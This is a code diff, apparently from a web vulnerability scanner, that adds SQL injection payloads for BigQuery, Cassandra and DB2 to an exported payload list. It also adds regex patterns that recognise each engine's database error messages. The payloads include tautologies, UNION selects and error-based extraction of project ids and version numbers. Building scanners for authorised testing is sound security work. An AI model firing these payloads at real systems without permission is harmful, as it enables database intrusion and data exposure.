@@ -74,6 +74,32 @@ const INSERT_CONTEXT = [
 // — Wide byte injection (GBK encoding bypass) —
 const WIDE_BYTE = ["%bf%27 OR 1=1--", "%A8%27 OR 1=1--"];
 
+// — BigQuery-specific —
+const BIGQUERY = [
+  "' OR if(1/(length((select('a')))-1)=1,true,false) OR '",
+  "' UNION ALL SELECT @@project_id,NULL,NULL#",
+  "' AND CAST(@@project_id AS INT64)--",
+  "' GROUP BY 1 UNION ALL SELECT NULL,NULL,NULL#",
+  "1' AND 1=(SELECT CAST(@@project_id AS INT64))#",
+];
+
+// — Cassandra / CQL-specific —
+const CASSANDRA = [
+  "' ALLOW FILTERING;%00",
+  "admin'/*",
+  "' OR 1=1 ALLOW FILTERING--",
+  "'%00",
+];
+
+// — DB2-specific —
+const DB2 = [
+  "' AND 1=CAST((SELECT VERSIONNUMBER FROM SYSIBM.SYSVERSIONS FETCH FIRST 1 ROW ONLY) AS INT)--",
+  "' UNION SELECT NULL FROM SYSIBM.SYSDUMMY1--",
+  "' AND 1=(SELECT COUNT(*) FROM SYSIBM.SYSDUMMY1)--",
+  "'||CHR(65)||CHR(66)||'",
+  "' AND xmlagg(xmlrow(1))IS NOT NULL--",
+];
+
 export const SQL_PAYLOADS = [
   ...BOOLEAN_BASED,
   ...UNION_BASED,
@@ -83,6 +109,9 @@ export const SQL_PAYLOADS = [
   ...WAF_BYPASS,
   ...INSERT_CONTEXT,
   ...WIDE_BYTE,
+  ...BIGQUERY,
+  ...CASSANDRA,
+  ...DB2,
 ];
 
 export const SQL_ERROR_PATTERNS: { engine: string; pattern: RegExp }[] = [
@@ -139,6 +168,29 @@ export const SQL_ERROR_PATTERNS: { engine: string; pattern: RegExp }[] = [
   { engine: "MS Access", pattern: /Microsoft Access Driver/i },
   { engine: "MS Access", pattern: /JET Database Engine/i },
   { engine: "MS Access", pattern: /Syntax error in query expression/i },
+
+  // BigQuery
+  { engine: "BigQuery", pattern: /com\.google\.cloud\.bigquery/i },
+  { engine: "BigQuery", pattern: /BigQueryException/i },
+  { engine: "BigQuery", pattern: /Syntax error in SQL query/i },
+  { engine: "BigQuery", pattern: /invalidQuery/i },
+  { engine: "BigQuery", pattern: /bigquery\.v2\.jobs/i },
+
+  // Cassandra
+  { engine: "Cassandra", pattern: /com\.datastax\.driver/i },
+  { engine: "Cassandra", pattern: /InvalidQueryException/i },
+  { engine: "Cassandra", pattern: /SyntaxException/i },
+  { engine: "Cassandra", pattern: /line \d+:\d+ no viable alternative/i },
+  { engine: "Cassandra", pattern: /CqlException/i },
+  { engine: "Cassandra", pattern: /cassandra\.CQLException/i },
+
+  // DB2
+  { engine: "DB2", pattern: /SQLCODE/i },
+  { engine: "DB2", pattern: /DB2 SQL Error/i },
+  { engine: "DB2", pattern: /CLI Driver.*DB2/i },
+  { engine: "DB2", pattern: /com\.ibm\.db2/i },
+  { engine: "DB2", pattern: /DSNT\d{3}I/i },
+  { engine: "DB2", pattern: /SQL0\d{3}N/i },
 
   // Generic / PDO
   { engine: "Generic", pattern: /SQLSTATE\[/i },
